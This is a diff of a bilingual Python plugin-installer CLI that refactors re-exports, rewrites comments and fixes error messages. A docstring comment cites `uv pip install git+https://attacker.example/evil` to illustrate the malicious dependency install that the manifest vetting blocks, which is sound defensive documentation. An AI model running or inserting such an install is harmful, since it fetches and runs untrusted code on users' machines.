@@ -288,7 +288,11 @@ def _unknown_catalog_name(spec: str, known: list[str]) -> ValueError:
             f"這份安裝的內建外掛目錄裡沒有 {spec!r}。",
             f"No plugin pack named {spec!r} in this install's catalog.",
         ),
-        t(f"目前可裝的內建包：{have}", f"Built-in packs available here: {have}"),
+        # "Built-in" was true when the catalog held nothing else. It now
+        # lists the official GitHub packs too, and a heading that calls them
+        # built-in tells a reader who just typed one of their names that they
+        # are looking at the wrong list.
+        t(f"目前可裝的套件：{have}", f"Available packs here: {have}"),
     ]
     if not known:
         lines.append(
@@ -344,13 +348,13 @@ def parse_source(spec: str) -> tuple[str, str, str, str]:
 #
 # Plain re-exports, not wrappers: the request rules (the token header, the two
 # shapes of failure, the size cap) live in ``app.core.plugins.github`` so the
-# server obeys them too. They keep their names here because these are the
-# attributes the install tests replace to stay off the network -- patching
-# ``plugins.resolve_sha`` has to be what ``_install_github`` calls.
+# server obeys them too. These three keep their names here because they are
+# what this module CALLS, and the install tests replace them to stay off the
+# network -- patching ``plugins.resolve_sha`` has to be what
+# ``_install_github`` calls. Anything else in that module is reached through
+# ``core_github``: a re-export nobody reads is a second name for one rule.
 
 USER_AGENT = core_github.USER_AGENT
-MAX_TARBALL_BYTES = core_github.MAX_TARBALL_BYTES
-_gh_get = core_github._gh_get
 resolve_sha = core_github.resolve_sha
 download_tarball = core_github.download_tarball
 
@@ -440,18 +444,13 @@ def _backend_reload() -> bool:
         return False
 
 
-# The vetting that keeps a manifest's ``[python_deps]`` from becoming
-# ``uv pip install git+https://attacker.example/evil``; the rule and its
-# reasoning live in ``app.core.plugins.deps``. Re-exported under the names
-# this module has always had.
-_SAFE_DEP_NAME = core_deps._SAFE_DEP_NAME
-_SAFE_DEP_VERSION = core_deps._SAFE_DEP_VERSION
-_UnsafeDepSpec = core_deps._UnsafeDepSpec
-_build_dep_spec = core_deps._build_dep_spec
-
-
 def _install_deps(deps: dict[str, str]) -> int:
     """Install ``python_deps`` via ``uv pip`` into the codefyui venv.
+
+    The vetting that keeps a manifest's ``[python_deps]`` from becoming
+    ``uv pip install git+https://attacker.example/evil`` is
+    :func:`app.core.plugins.deps.dep_specs`; every spec this command runs
+    comes back through it.
 
     Targets the current interpreter explicitly with ``--python sys.executable``.
     ``cdui``/``dev.py`` re-exec into ``backend/.venv`` before running plugin
@@ -545,9 +544,15 @@ def capability_gate(
         )
         return CAPABILITIES_REFUSED
 
-    # ``None`` rather than an empty tuple when there is no record: "installed
-    # before and granted nothing" and "never installed" differ, and only the
-    # first makes an unchanged request into growth worth warning about.
+    # ``decide_capabilities`` tells "installed before and granted nothing"
+    # (``()``) from "never installed" (``None``), because only the first
+    # makes an unchanged request into growth worth warning about. The CLI
+    # deliberately collapses them with ``or None``: every caller here passes
+    # a list, an empty one arrives from an install that recorded nothing as
+    # readily as from an update that granted nothing, and treating that as an
+    # empty GRANT would print "this is more than last time" for a first
+    # install. Keeping today's output is the reason; a route with a real
+    # lockfile behind it can pass the distinction through.
     prior = normalize_capabilities(getattr(args, "prior_capabilities", None))
     decision = core_consent.decide_capabilities(requested, prior=prior or None)
     if not decision.missing:
@@ -1445,11 +1450,13 @@ def cmd_uninstall(args: argparse.Namespace) -> int:
         # The files are still there, so the plugin would load again on the
         # next start: nothing was uninstalled, and saying otherwise would be
         # a lie the lockfile then tells forever. Windows holding a file open
-        # is the usual cause.
-        plugin_dir = plugins_user_root() / plugin_id
+        # is the usual cause. The path comes back with the outcome rather
+        # than being rebuilt here from the id -- where a pack's files live is
+        # the lifecycle module's rule, and a second copy of it would print
+        # the wrong directory the day the rule changes.
         err(
             f"刪除失敗：{outcome.error}",
-            f"Failed to remove {plugin_dir}: {outcome.error}",
+            f"Failed to remove {outcome.directory}: {outcome.error}",
         )
         return 1
 
